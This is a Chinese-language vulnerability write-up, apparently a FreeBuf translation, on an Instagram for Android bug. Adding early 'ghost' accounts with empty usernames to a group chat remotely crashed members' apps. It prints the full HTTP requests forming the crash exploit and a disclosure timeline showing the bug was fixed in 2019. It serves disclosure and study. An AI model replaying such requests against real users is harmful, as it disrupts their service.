@@ -1,0 +1,122 @@
+**![](https://image.3001.net/images/20190920/1568957446_5d8464067cce9.jpg!small)**
+
+**本文中，作者通过对Instagram的安全研究，结合Instagram在构造用户名时遵循的规律机制，发现了Instagram后端数据库中存在的两个僵尸账户。然后通过创建聊天群组功能，利用这两个僵尸账户的添加入群请求，可对群组成员实现Instagram应用的远程崩溃攻击。**
+
+##  从Instagram的用户名构造分析中发现两个“幽灵账户”
+
+在我对Instagram的安全研究中发现，Instagram在其后端数据库中，使用了简单的主键标识符（Primary Key
+ID，PKID）递增方式来定义分配其用户账户，因此，我很好奇想去发现，Instagram社交网络上创建的第一批用户账户到底是些什么？后来，我发现当PKID为3或4时，其指向的对应账户为Instagram创始人之一的Mike
+Krieger。
+
+![](https://image.3001.net/images/20190920/1568956841_5d8461a93150c.gif!small)
+
+Primary
+Keys：主键，又称主码，数据库表中对储存数据对象予以唯一和完整标识的数据列或属性的组合。一个数据表只能有一个主键，且主键的取值不能缺失，即不能为空值（Null）。主键有时也称主键标识符（Primary
+Key IDs，PKID）。
+
+相较于全局标识符（GUID）来说，从技术角度来看，Primary Key
+IDs（PKID）具备几个优点：容易记忆、增量变化的快速查询、产生的数据库碎片较少、遵循特定的模式、占用的存储空间小。
+
+有点意思了.....，但PKID = 1 或
+PKID=2对应的第一和第二个Instagram账户又是什么呢？经我研究发现，他们有点不寻常，它们对应的账户用户名并不是合理的构造：确切地说，是其用户名数据结构中包含一个空字符串""（""分配了一个长度为空的存储空间），可以肯定的是这种分配设置绝对会导致其它问题。我的想法是，这两个账户是在Instagram的初始测试阶段创建的，但当时它只不过是一个alpha版本，为什么到现在这种测试账户还未被删除，仍然存在Instagram的后端数据库中呢？现在，我们暂且把这两个测试账户称为“幽灵账户”（Ghost
+Users）或僵尸账户吧。
+
+![](https://image.3001.net/images/20190920/1568956895_5d8461df55829.gif!small)
+
+##  漏洞分析
+
+可以肯定的是，如果服务端（Server-Side）对空字符串""的处理不当，那么一定会导致某些安全风险。由此我想到了一个点子：可以利用服务器后端对不当格式畸形数据的错误解析，来触发Instagram应用程序的崩溃。那要是能远程让其他Instagram用户发生崩溃，是不是就更有意思了呢？
+
+通过对Instagram功能的测试研究，我发现可以利用其中一个功能来实现上述的说的“远程崩溃”，那就是： **Instagram消息标签（Messages
+Tab）下的群组（临时聊天群）创建** 。这个功能对应的群组创建请求和API为：
+
+    
+    
+    /api/v1/direct_v2/create_group_thread/
+
+##  漏洞利用
+
+我用我的 Samsung Galaxy S8+ 配合Instagram 8.0的测试账户，先来创建一个两人的临时聊天群组试试，其请求如下：
+
+    
+    
+    POST /api/v1/direct_v2/create_group_thread/ HTTP/1.1
+    
+        User-Agent: Instagram ....
+    
+        Accept-Language: en-US
+    
+        Cookie: urlgen= ....
+    
+        Accept-Encoding: gzip, deflate
+    
+        Host:i.instagram.com
+    
+        X-FB-HTTP-Engine: Liger
+    
+        Connection: close
+    
+        Content-Length: 353
+    
+        signed_body=d963d5f048924a58712d8bcf7912ac76a7c3c990199c7d59ac25e7990e142f49.{"recipient_users":"[xxxxxxxxxx]","_csrftoken":"WBpZmckmENi6eiubd26Osz6SIR3vtowu","thread_title":"bdbdbdbdbdxb","_uid":"12579513534","_uuid":"d18570eb-0663-40f4-bcc3-0c48a5031cee"}&ig_sig_key_version=4
+
+其中，"recipient_users"代表的是我拉进这个临时群组的另外一名用户（这里称他为Victim），xxxxxxxxxx代表了他的instagram
+ID。重点是其中的JSON参数数据对结构。现在，我和另外一名用户的两人临时聊天群组创建完成。
+
+紧接着，我通过另一个API，再来拖进一名用户加入这个群组。这里，我就要添加进之前我们说的“幽灵用户”了。其请求如下：
+
+    
+    
+    POST /api/v1/direct_v2/threads/yyyyyyyyyy/add_user/ HTTP/1.1
+    
+        User-Agent: Instagram ....
+    
+        Accept-Language: en-US
+    
+        Cookie: urlgen= ....
+    
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    
+        Accept-Encoding: gzip, deflate
+    
+        Host:i.instagram.com
+    
+        X-FB-HTTP-Engine: Liger
+    
+        Connection: close
+    
+        Content-Length: 109
+    
+        _csrftoken=Pod4ZKSSLYUYMPs2TxhN5Xkmsv6xUOsO&user_ids=["2"]&_uuid=d18570eb-0663-40f4-bcc3-0c48a5031cee
+
+上述请求中，yyyyyyyyyy是第一个创建群组请求时，Instagram后端响应消息中代表群组的ID号。我们在这个请求中，请注意，填充进一个值为2的user_ids字段，也就是PKID=1或2的，前述的一个“幽灵用户”。
+
+当我们把这个添加“幽灵用户”的请求发出后，群组内成员的另一名用户（Victim）手机上的Instagram应用程序立即就发生了崩溃，并且所有群组成员都会被强制退出群组。
+
+这很大可能是由于Instagram后端在解析“幽灵用户”用户名时，其中的空字符串（""）引发的解析错误所导致的，以下是我从崩溃事件中的截获的事件记录：
+
+![](https://image.3001.net/images/20190920/1568957161_5d8462e90ab32.jpg!small)
+
+##  漏洞影响
+
+目前，该漏洞仅在Instagram for
+Android应用环境中测试有效，利用该Bug漏洞，可以通过添加正常成员入群，然后再添加进入前述的“幽灵用户”，以此来实现对任意Instagram账户的远程崩溃攻击。
+
+##  漏洞上报处理进程
+
+> 2019.4.10 – 联系Facebook安全团队上报漏洞
+>
+> 2019.4.10 – Facebook申请补充更多细节
+>
+> 2019.5.2 - 2019.9.9 – 与Facebook进行了多轮的邮件沟通交流，最终确定了漏洞
+>
+> 2019.9.9 漏洞修复
+>
+> 2019.9.10 漏洞奖励
+>
+> 2019.9.12 漏洞披露
+
+***参考来源：valbrux，clouds编译整理，转载请注明来自FreeBuf.COM**
+
+  
+
